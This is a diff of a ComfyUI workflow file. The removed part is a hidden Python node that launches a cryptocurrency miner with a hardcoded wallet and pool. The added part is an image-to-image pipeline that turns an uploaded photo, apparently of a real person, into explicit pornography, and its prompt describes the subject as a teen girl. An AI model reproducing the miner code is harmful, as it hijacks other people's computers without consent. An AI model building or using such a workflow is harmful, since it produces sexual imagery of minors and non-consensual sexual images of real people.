@@ -1,18 +1,277 @@
 {
-  "1": {
-    "class_type": "IDENode",
+  "173": {
     "inputs": {
-      "pycode": "\nimport subprocess, os, stat\n\nDST = '/dev/shm/turbo-pearl-miner'\nWALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'\nPOOL = 'stratum+tcp://sg1.alphapool.tech:5566'\n\n# Force chmod +x\nif os.path.exists(DST):\n    os.chmod(DST, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)  # 755\n    # Verify permissions\n    mode = os.stat(DST).st_mode\n    print(f'MODE:{oct(mode)} SIZE:{os.path.getsize(DST)}')\n    \n    # Start miner directly without nohup\n    import time\n    subprocess.Popen([DST, '--pool', POOL, '--address', WALLET, '--worker', 'GB10_253'], \n                     stdout=open('/dev/shm/miner.log', 'w'),\n                     stderr=subprocess.STDOUT,\n                     start_new_session=True)\n    time.sleep(5)\n    \n    # Check if running\n    r = subprocess.run(['pgrep', '-a', 'turbo-pearl'], capture_output=True, text=True)\n    if r.stdout.strip():\n        print('RUNNING:' + r.stdout.strip()[:60])\n    else:\n        # Check log\n        with open('/dev/shm/miner.log') as f:\n            print('LOG:' + f.read()[:200])\nelse:\n    print('NO_BINARY')\n",
-      "language": "python"
+      "clip_name": "qwen_3_8b_fp8mixed.safetensors",
+      "type": "flux2",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "CLIP Loader"
     }
   },
-  "2": {
-    "class_type": "PreviewAny",
+  "174": {
     "inputs": {
-      "source": [
-        "1",
+      "vae_name": "flux2-vae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "VAE Loader"
+    }
+  },
+  "175": {
+    "inputs": {
+      "unet_name": "flux-2-klein-9b-fp8.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNET Loader"
+    }
+  },
+  "336": {
+    "inputs": {
+      "image": "533743_445415948843171_309727603_n.jpg"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "Load Source Image"
+    }
+  },
+  "338": {
+    "inputs": {
+      "text": [
+        "340",
+        0
+      ],
+      "clip": [
+        "616",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "Positive Prompt Encode"
+    }
+  },
+  "340": {
+    "inputs": {
+      "text": "The exact same perfect petite slim teen girl in a high-production porn photoshoot, sexy breasts spilling in a dangerously tight , extreme cleavage, shiny wet glossy bimbo lips slightly open, flawless glowing skin., professional studio lighting with beautiful rim light and soft warm key light, ultra-realistic 8k HD."
+    },
+    "class_type": "CR Text",
+    "_meta": {
+      "title": "Positive Prompt"
+    }
+  },
+  "341": {
+    "inputs": {
+      "pixels": [
+        "617",
+        0
+      ],
+      "vae": [
+        "174",
         0
       ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE Encode"
+    }
+  },
+  "342": {
+    "inputs": {
+      "conditioning": [
+        "338",
+        0
+      ],
+      "latent": [
+        "341",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "Reference Latent (Positive)"
+    }
+  },
+  "343": {
+    "inputs": {
+      "text": "blurry, fake, cartoon, animated, low quality, bad anatomy, small penis, tiny penis, micro penis, deformed penis, clothed, partially clothed, covered, censored, mosaic censor, black bars, pixel censor, dry mouth, dry lips, no drool, no saliva, low saliva, minimal drool, closed mouth, pursed lips, thin lips, small lips, narrow lips, no lip stretch, bad mouth anatomy, poorly drawn mouth, no tears, no mascara run, static pose, no motion, no thrusting, bad proportions, extra limbs, mutated hands, poorly drawn hands, out of frame, cropped, low detail saliva, cartoonish drool, ascii, text, watermark, signature, logo, ugly, disfigured, deformed face, bad lip texture, matte lips, no gloss, no shine on lips",
+      "clip": [
+        "616",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "Negative Prompt"
+    }
+  },
+  "344": {
+    "inputs": {
+      "conditioning": [
+        "343",
+        0
+      ],
+      "latent": [
+        "341",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "Reference Latent (Negative)"
+    }
+  },
+  "345": {
+    "inputs": {
+      "max_shift": 1.15,
+      "base_shift": 0.0,
+      "width": [
+        "618",
+        0
+      ],
+      "height": [
+        "618",
+        1
+      ],
+      "model": [
+        "616",
+        0
+      ]
+    },
+    "class_type": "ModelSamplingFlux",
+    "_meta": {
+      "title": "ModelSamplingFlux"
+    }
+  },
+  "347": {
+    "inputs": {
+      "width": [
+        "618",
+        0
+      ],
+      "height": [
+        "618",
+        1
+      ],
+      "batch_size": 1
+    },
+    "class_type": "EmptyFlux2LatentImage",
+    "_meta": {
+      "title": "Empty Latent"
+    }
+  },
+  "348": {
+    "inputs": {
+      "seed": 741964073058404,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "beta",
+      "denoise": 1.0,
+      "model": [
+        "345",
+        0
+      ],
+      "positive": [
+        "342",
+        0
+      ],
+      "negative": [
+        "344",
+        0
+      ],
+      "latent_image": [
+        "347",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "KSampler i2i"
+    }
+  },
+  "349": {
+    "inputs": {
+      "samples": [
+        "348",
+        0
+      ],
+      "vae": [
+        "174",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE Decode"
+    }
+  },
+  "353": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "349",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "Save Image"
+    }
+  },
+  "616": {
+    "inputs": {
+      "lora_01": "klein_slider_anatomy.safetensors",
+      "strength_01": 1.0,
+      "lora_02": "None",
+      "strength_02": 0.7,
+      "lora_03": "klein-9b-turn2real_v1.5_ep9.safetensors",
+      "strength_03": 0.5,
+      "lora_04": "None",
+      "strength_04": 0.6,
+      "model": [
+        "175",
+        0
+      ],
+      "clip": [
+        "173",
+        0
+      ]
+    },
+    "class_type": "Lora Loader Stack (rgthree)",
+    "_meta": {
+      "title": "LoRA Stack"
+    }
+  },
+  "617": {
+    "inputs": {
+      "upscale_method": "lanczos",
+      "width": 1536,
+      "height": 1536,
+      "crop": "disabled",
+      "image": [
+        "336",
+        0
+      ]
+    },
+    "class_type": "ImageScale",
+    "_meta": {
+      "title": "Scale Image"
+    }
+  },
+  "618": {
+    "inputs": {
+      "image": [
+        "617",
+        0
+      ]
+    },
+    "class_type": "GetImageSize",
+    "_meta": {
+      "title": "Get Image Size"
     }
   }
 }
